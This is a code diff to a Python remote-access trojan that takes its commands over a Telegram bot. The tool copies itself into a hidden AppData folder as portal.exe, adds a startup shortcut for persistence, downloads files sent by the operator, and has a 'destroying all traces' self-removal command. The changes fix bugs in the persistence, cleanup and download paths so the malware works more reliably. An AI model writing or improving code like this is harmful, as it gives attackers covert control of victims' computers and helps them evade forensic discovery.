@@ -34,10 +34,10 @@ if (argv[0]).endswith('.exe'):
 	hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
 	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
 	# ---------------------------------------------
+	target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
 	if not os.path.exists(hide_folder):
 		os.makedirs(hide_folder)
 		hide_compiled = hide_folder + '\\' + compiled_name
-		target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
 		copyfile(argv[0], hide_compiled)
 		shell = Dispatch('WScript.Shell')
 		shortcut = shell.CreateShortCut(target_shortcut)
@@ -163,8 +163,10 @@ def handle(msg):
 				bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
 				if os.path.exists(hide_folder):
 					for file in os.listdir(hide_folder):
-						if not file == argv[0]:
+						try:
 							os.remove(hide_folder + '\\' + file)
+						except:
+							pass
 				if os.path.isfile(target_shortcut):
 					os.remove(target_shortcut)
 				while True:
@@ -175,7 +177,7 @@ def handle(msg):
 			file_path = bot.getFile(file_id=file_id)['file_path']
 			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
 			file = (requests.get(link, stream=True)).raw
-			with open(hide_folder + '//' + file_name, 'wb') as out_file:
+			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
 				copyfileobj(file, out_file)
 
 bot = telepot.Bot(token)
